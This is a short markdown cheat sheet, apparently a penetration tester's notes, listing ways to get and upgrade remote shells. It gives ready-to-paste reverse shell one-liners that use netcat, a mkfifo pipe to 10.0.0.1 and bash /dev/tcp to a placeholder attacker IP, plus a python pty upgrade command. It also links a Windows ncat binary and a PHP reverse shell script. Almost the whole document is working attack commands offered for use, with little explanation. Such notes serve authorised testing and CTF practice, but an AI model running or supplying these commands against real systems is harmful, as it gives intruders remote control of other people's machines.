# Shells
Tags: #upgrade #python #nc #netcat #php #privesc #linux 

## Python shell upgrade
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Full shell capabilities, phineas style
[Guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic)

## Python shells
https://github.com/infodox/python-pty-shells

## Bash
### nc reverse shell shit
**Note**: full paths might be necessary. `-e` is kinda rare
```
# Target
/bin/nc attacker-machine-ip port -e /bin/sh

# Host
nc -nlvp localhost port
```

### bash mkfifo reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Plain bash
```
/bin/bash -c 'bash -i >& /dev/tcp/$YOURIP/$REVSHELLPORT 0>&1'
```

## ncat static binary for Windows
https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe

## PHP reverse shell
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php